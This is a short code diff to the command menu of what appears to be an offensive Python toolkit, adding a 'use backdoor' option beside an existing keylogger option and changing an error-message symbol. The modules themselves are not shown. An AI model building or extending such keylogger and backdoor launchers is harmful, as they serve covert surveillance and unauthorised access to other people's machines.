@@ -57,6 +57,10 @@ def main():
             activated_option.append('/KeyLogger')
             execfile_y('sub_frames/keylogger.py', global_dict)
 
+        elif command == 'use backdoor':
+            activated_option.append('/Backdoor')
+            execfile_y('sub_frames/backdoor.py', global_dict)
+
         elif command == 'exit' or command == 'quit':
             break
 
@@ -67,7 +71,7 @@ def main():
             pass
 
         else:
-            print(colors.Red + "[-]Invalid Command use 'help' command to view help" + colors.RESET)
+            print(colors.Red + "[✘]Invalid Command use 'help' command to view help" + colors.RESET)
 
     
 main()
